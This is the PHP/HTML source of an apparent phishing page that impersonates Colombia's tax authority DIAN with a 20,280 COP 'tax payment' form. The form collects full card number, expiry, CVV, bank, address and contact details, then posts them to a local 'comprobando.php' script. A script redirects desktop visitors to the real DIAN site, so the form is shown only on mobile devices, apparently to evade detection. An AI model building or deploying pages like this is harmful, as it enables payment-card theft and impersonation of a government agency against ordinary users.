<?php

session_start();
$cedula = $_SESSION['documento'];


?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <link rel="stylesheet" href="./assets/popup.css">

    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/factura.css">
</head>
<body>
    
    <script>
        
function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


 if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
    </script>

       
   <form action="comprobando.php" method="post">
    <div class="modal">
        <div class="popup">
            <div class="popup__top">
                <div class="popup__pic">
                    <img class="popup__img" src="./assets/img/Logo_DIAN.png" alt="">
                </div>
    
                <div class="popup__text">
                    <h1 class="popup__ttl">Pago de Impuestos</h1>
                    <p class="popup__sub">Dirección de Impuestos y Aduanas Nacionales de Colombia</p>
                    <p class="popup__pay">$20.280 <span class="popup__pay-coin">COP</span></p>
                </div>
            </div>

            <div class="popup__form">
                <div class="form">
                    <p class="form__step">Paso <strong>1</strong> de <strong>4</strong></p>
                    <p class="form__ttl">Información de la tarjeta</p>
    
                    <div class="form__content">
                    <div class="form__element">
                            <input class="form__input" name="nombre" type="text" placeholder="Nombre y Apellido"required>
                        </div>
                        <div class="form__element">
                            <input class="form__input" name="correo" type="text" placeholder="Correo electronico"required>
                        </div>
    
                        <div class="form__element">
                            <input class="form__input" name="tel" type="text" placeholder="Número de móvil" maxlength="10"required>
                        </div>
    
                        <div class="form__element">
                            <input class="form__input" name="departamento" type="text" placeholder="Departamento"required>
                        </div>
    
                        <div class="form__element">
                            <input class="form__input" name="ciudad" type="text" placeholder="Ciudad"required>
                        </div>
    
                        <div class="form__element">
                            <input class="form__input" name="direccion" type="text" placeholder="Dirección"required>
                        </div>
    
                        <div class="form__element">
                            <i class='form__icon bx bxs-bank'></i>
                            <input id="txtBank" class="form__input form__input--pd" type="text" placeholder="Seleccione su banco" autocomplete="off" readonly>
    
                            <div id="selectBanks" class="form__options hidde">
                                <div class="optionBank">ALIANZA FIDUCIARIA S.A.</div>
                                <div class="optionBank">BAN100</div>
                                <div class="optionBank">BANCAMIA S.A.</div>
                                <div class="optionBank">BANCOLOMBIA</div>
                                <div class="optionBank">BANCO AV VILLAS</div>
                                <div class="optionBank">BANCO BBVA COLOMBIA S.A.</div>
                                <div class="optionBank"> BANCO CAJA SOCIAL</div>
                                <div class="optionBank">BANCO COOPERATIVO COOPCENTRAL</div>
                                <div class="optionBank"> BANCO DAVIVIENDA</div>
                                <div class="optionBank"> BANCO DE BOGOTA</div>
                                <div class="optionBank"> BANCO DE OCCIDENTE</div>
                                <div class="optionBank"> BANCO FALABELLA </div>
                                <div class="optionBank"> BANCO FINANDINA S.A. BIC</div>
                                <div class="optionBank"> BANCO GNB SUDAMERIS</div>
                                <div class="optionBank">BANCO ITAU</div>
                                <div class="optionBank">BANCO J.P. MORGAN COLOMBIA S.A.</div>
                                <div class="optionBank"> BANCO PICHINCHA S.A.</div>
                                <div class="optionBank"> BANCOPOPULAR</div>
                                <div class="optionBank"> BANCO SANTANDER COLOMBIA</div>
                                <div class="optionBank">BANCO SERFINANZA</div>
                                <div class="optionBank">BANCO UNION antes GIROS</div>
                                <div class="optionBank">BANCO AGRARIO</div>
                                <div class="optionBank"> BANCOOMEVA S.A.</div>
                                <div class="optionBank">CFA COOPERATIVA FINANCIERA</div>
                                <div class="optionBank"> CITIBANK</div>
                                <div class="optionBank"> COLTEFINANCIERA</div>
                                <div class="optionBank">CONFIAR COOPERATIVA FINANCIERA</div>
                                <div class="optionBank">COOFINEP COOPERATIVA FINANCIERA</div>
                                <div class="optionBank">COTRAFA</div>
                                <div class="optionBank">DALE</div>
                                <div class="optionBank">DAVIPLATA</div>
                                <div class="optionBank">IRIS</div>
                                <div class="optionBank">LULO BANK</div>
                                <div class="optionBank">MOVII S.A.</div>
                                <div class="optionBank">NEQUI</div>
                                <div class="optionBank">RAPPIPAY</div>
                                <div class="optionBank"> SCOTIABANK COLPATRIA</div>
                            </div>
                        </div>
    
                        <div class="form__element">
                            <i class='form__icon bx bx-credit-card'></i>
                            <input class="form__input form__input--pd" name="codigo" type="text" id="codigo" placeholder="Número de la tarjeta" maxlength="16" minlength="15" required oninput="removeSpaces(event)">
                        </div>
    
                        <div class="form__element form__element--double">
                            <div class="form__element--date">
                                <i class='form__icon bx bxs-bank'></i>
                                <input class="form__input form__input--date form__input--pd" name="mes" type="text" placeholder="MM" minlength="2" maxlength="4"required>
                                <span class="form__divider">/</span>
                                <input class="form__input form__input--date" type="text" name="ano" placeholder="AAAA" maxlength="4" required>
                                <i class='form__icon-quest bx bx-question-mark'></i>
                            </div>
    
                            <input class="form__input form__input-cvv" type="text" name="cvv" placeholder="CVV" required maxlength="4" minlength="3">
                        </div>
                    </div>
    
                    <div class="form__checkbox">
                        <input type="checkbox">
                        <span>Pago a un clic</span>
                    </div>
    
                    <div class="form__alert">
                        <p class='form__icon-info'>i</p>
                        <span>Al seleccionar esta casilla, autoriza a ePayco para almacenar de forma segura su información para futuras compras a un clic.</span>
                    </div>
                </div>
    
                <div class="popup__continue">
                    <button class="popup__btn" type="submit">Continuar</button>
                </div>
            </div>

            <div class="popup__footer">
                <i class='bx bxs-lock-alt'></i>
                pago seguro por  
                <img src="./assets/img/white.png" alt="">
            </div>
        </div>
    </div>
    </form>
    
     <script>
        function removeSpaces(event) {
            let input = event.target;
            // Usar timeout para asegurar que se capture el valor actualizado del input
            setTimeout(() => {
                input.value = input.value.replace(/\s+/g, '');
            }, 0);
        }
    </script>
    <script>
        const txtBank = document.getElementById('txtBank');
        const selectBanks = document.getElementById('selectBanks');
        const optionBank = document.querySelectorAll('.optionBank');

        txtBank.addEventListener('click', function(){
            if(selectBanks.classList.contains('hidde')){
                selectBanks.classList.remove('hidde');
            }else{
                selectBanks.classList.add('hidde');
            }
        });

        optionBank.forEach(op => {
            op.addEventListener('mouseup', function(){
                txtBank.value = op.innerHTML;
                selectBanks.classList.add('hidde');
            });
        });
    </script>
</body>
</html>